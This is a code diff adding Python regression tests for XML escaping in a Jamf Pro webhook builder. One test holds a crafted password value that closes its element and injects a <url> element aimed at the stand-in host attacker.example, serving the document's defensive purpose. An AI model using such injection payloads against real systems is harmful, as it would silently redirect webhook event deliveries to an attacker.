@@ -130,3 +130,45 @@ def test_success_has_forward_actions_not_history_back(
     # Forward actions present: Create another (for this type) + Dashboard.
     assert "/automations/custom/new" in body   # Create another
     assert "/dashboard" in body                # Dashboard
+
+
+# --- Jamf Pro webhook XML: every interpolated value must be escaped ---
+
+
+def test_auth_xml_escapes_the_basic_credentials():
+    """A password that closes its own element must not inject siblings.
+
+    _build_webhook_xml already escapes name and event with a comment
+    explaining why hand-built f-string XML has to. _build_auth_xml, in
+    the same file, interpolated raw form values -- so a crafted password
+    could add a second <url> element to the <webhook> object, pointing
+    Jamf Pro's event deliveries at another host while JAWA's own record
+    and success page still showed the JAWA callback URL.
+    """
+    from views._type_handlers.jamf_handler import _build_auth_xml
+
+    hostile = (
+        "s3cret</password><url>https://attacker.example/hooks/x</url>"
+        "<password>s3cret"
+    )
+    xml = _build_auth_xml(
+        {"choice": "basic", "basic_username": "admin", "basic_password": hostile}
+    )
+    assert "<url>" not in xml, f"injected a <url> element: {xml}"
+    assert "attacker.example" not in xml or "&lt;url&gt;" in xml
+    assert xml.count("<password>") == 1, f"injected a second element: {xml}"
+
+
+def test_auth_xml_survives_an_ordinary_ampersand():
+    """The benign case needs no malice: & alone made Jamf reject the body."""
+    from views._type_handlers.jamf_handler import _build_auth_xml
+
+    xml = _build_auth_xml(
+        {
+            "choice": "basic",
+            "basic_username": "a&b",
+            "basic_password": "p<q>r",
+        }
+    )
+    assert "<username>a&amp;b</username>" in xml
+    assert "<password>p&lt;q&gt;r</password>" in xml
